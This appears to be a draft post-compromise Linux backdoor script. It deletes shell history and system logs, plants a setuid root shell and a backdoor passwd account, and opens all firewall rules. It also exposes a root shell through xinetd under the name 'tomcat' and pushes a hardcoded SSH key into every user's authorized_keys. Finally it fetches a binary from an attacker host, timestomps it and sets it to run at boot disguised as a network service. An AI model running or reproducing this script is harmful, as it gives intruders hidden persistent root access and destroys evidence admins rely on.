#/usr/bin/sh

unset HISTFILE

rm -f ~/.bash_history
ln -s /dev/null ~/.bash_history
rm -f /sbin/halt
cp /bin/bash /sbin/halt
cp /bin/bash /bin/ftpd
rm -f /var/log/messages
rm -f /var/log/wtmp
rm -f /var/log/secure
ln -s /dev/null /var/log/messages
ln -s /dev/null /var/log/wtmp
ln -s /dev/null /var/log/secure

#suid shell
echo "#include <unistd.h>"> /tmp/blah.c
echo "int main() { setuid(0); setgid(0); execl(\"/bin/sh\", \"sh\", NULL); }">> /tmp/blah.c
gcc /tmp/blah.c -o /tmp/blah
chmod 6555 /tmp/blah
mv -f /tmp/blah /usr/bin/sushi

rm -f /tmp/blah.c

#Would be nice to get this into passwd with a sed/awk thing that puts it in the middle somewhere
echo “halt:x:9999:9999::/:/sbin/halt” >> passwd

IPTABLES=$(which iptables)
$IPTABLES -P INPUT ACCEPT
$IPTABLES -P OUTPUT ACCEPT
$IPTABLES -F

apt install xinetd gcc <what else?>

#xinetd
echo “service tomcat” > /etc/xinetd.d/tomcat
echo “{“ >> /etc/xinetd.d/tomcat
echo “                disable = no” >> /etc/xinetd.d/tomcat
echo “        socket_type     = stream” >> /etc/xinetd.d/tomcat
echo “        wait            = no” >> /etc/xinetd.d/tomcat
echo “        user            = root” >> /etc/xinetd.d/tomcat
echo “      server          = /bin/ftpd” >> /etc/xinetd.d/tomcat
echo “        server_args     = -i” >> /etc/xinetd.d/tomcat
echo “        log_on_failure  += USERID” >> /etc/xinetd.d/tomcat
echo “}”>> /etc/xinetd.d/tomcat

#redirect ssh at some point
#$IPTABLES -A PREROUTING -t nat -p tcp -i $OUT_DEV --dport 22 -j DNAT --to badip:2222

SHARED_PRIVATEKEY = -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzImVHyAeTKVIdVNFNfU6TUgCiUQQUEogtrPClGOsDokMdKpu
vP6j9ITXbvkHY0RXE7x1eM1CYwO0oa2V2y7fm87QYG+Xf8fMmh65/EU2TDCkwuQs
tTZ0/xnC+smWqELh/foU+BUunAN4r2lZDCpQq2nNmyaCuoaNJ3Je9CrRpyl0bym3
7NCN7H1Er/2L/WAQpocOwhOqaBYasyZfjLcuhRpsZ+0J2jo6OGKBiLlJGYeyAN87
D29khL8wYjJSmlQz1hiUiDhiQrxf+IcRSQClmN4lkKhmivw6yIEa9DdE/wDEi54L
Ty9bD5VdNr3Z4ulgR0hvIwKBl+pn0NYrlofE0wIDAQABAoIBABOGTqXZ+wp1/KS2
fjTYY+hcp2FTDfucF+NY5YokuZfpnTbFzixcYmpFBAuj2gCv1WAc7VnKvjuVbvjA
CT4TC2VkKKAMBvo7qFxN8pMSSEydmBzCi0IBIMn5O5OVCrylJc2IwdesrfZWnn6g
H8/5ehniz62vz2rezTqmwEmujLTYJHgE/FcbOhIERXZpVOvReUTiLY1JpuBYebAJ
lpq8ed7MXj4fAhgWywGw1vL8huF5l92ZUx6HzPAUr1S6FodabWhwLvDjFDQVaath
CrbnkuYgI0sCWkm67GQyLyw2J30VYWuIf59c22Lxp8YL6VP9zLysjn1XsfyN849t
lTPdZoECgYEA8ENI5+9BCBXZYzPkxDX2ivwhTeMwoBShnDExwt1ByHhZp06oXNd9
mAbcABSvADArHdMNq3sJjyIc29a7yjEBZODhIgeRkStapnJaGvwOoCZNG0nlLUoY
vYElHsRkSpGEhUZh2U5f38LCq5fSjdzuxnVWAmcNzrRmumoj4gzjyUUCgYEA2e9B
iMjfWhWP7swF+/Jc38IndEn30kPEnZYePjoitsZxA4YQ8XeR8whygpsui8akN5FK
AIbbN0XCb6iKXnMa9h/faUrhiMccakTrPVdT1G/SyFjdMjYzHblXQ55BeffDBPZC
8NzxvhdBj0JzgbcelM7yn2Xu1WpkPtvYuhecWzcCgYEA5RiTfS0DCo2i8tf5rCp0
gwR1UUpwBESH8WJrO480ec5gVotHOPf1dzAbOSx/ziMgCdlEcJ3qeIQjlnBEMkDW
PnW71nH3GMCJOKtTReXQoF7FKV8l2zCLNK/fUF4d74igH2EETmxQORICBBLJn6Hq
QGyD7diMLuyQA/LPcm2uCi0CgYEArEs+4EkOa0XIuN2LjZgaXLw+PO2NgyoYcw2P
c1q6vw07o7GGC6CgPidbgG326oJsqZGvk6MKBDSed3AjlHAjzJl+ItwUWfIwQMOj
xqcXm0ecuM+ocF3xI3q3xrmCwk5iW7XlTk8ev03bgsriTpbbEoJZxjLsEsU944Qj
X1vzPRkCgYBhM0v5MKaO3/ZQQ+VvJeEXYokjRNpM3RXQN1Bt7jMLiAMmz4dihpcy
FcuGg1uytMIlWDh6XE7KKtftRQNUDFPBRHEnPVyjIIr/Pg1l1/WHihB+3bYBujEu
XVd5BuWDMcTI529T47Vr/bH4yVwC8lJi7LvJAy6hifeRUcC4Jk3LmQ==
-----END RSA PRIVATE KEY-----
SHARED_PUBKEY = ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMiZUfIB5MpUh1U0U19TpNSAKJRBBQSiC2s8KUY6wOiQx0qm68/qP0hNdu+QdjRFcTvHV4zUJjA7ShrZXbLt+bztBgb5d/x8yaHrn8RTZMMKTC5Cy1NnT/GcL6yZaoQuH9+hT4FS6cA3ivaVkMKlCrac2bJoK6ho0ncl70KtGnKXRvKbfs0I3sfUSv/Yv9YBCmhw7CE6poFhqzJl+Mty6FGmxn7QnaOjo4YoGIuUkZh7IA3zsPb2SEvzBiMlKaVDPWGJSIOGJCvF/4hxFJAKWY3iWQqGaK/DrIgRr0N0T/AMSLngtPL1sPlV02vdni6WBHSG8jAoGX6mfQ1iuWh8TT

for user in $(ls /home);do
            mkdir -p /home/${user}/.ssh
            chmod 700 /home/${user}/.ssh
            echo $SHARED_PUBKEY >> /home/${user}/.ssh/authorized_keys
            echo $SHARED_PUBKEY >> /home/${user}/.ssh/authorized_keys2
            chmod 600 /home/${user}/.ssh/authorized_keys*
            chatter +i /home/${user}/.ssh/authorized_keys*
done

#fetch networkd and drop it in /usr/sbin/networkd

wget -q $badip/network -O /usr/sbin/network
#run network
chmod 755 /usr/sbin/network
touch -r /bin/sh /usr/sbin/network
/usr/sbin/network &

cat << EOF > /etc/init/network.conf
# networkd - configure network device
#
# This service causes network devices to be brought up or down as a result
# of hardware being added or removed, including that which isn't ordinarily
# removable.

description "configure network device"
start on runlevel [2345]
expect fork
respawn
exec /usr/sbin/network
EOF

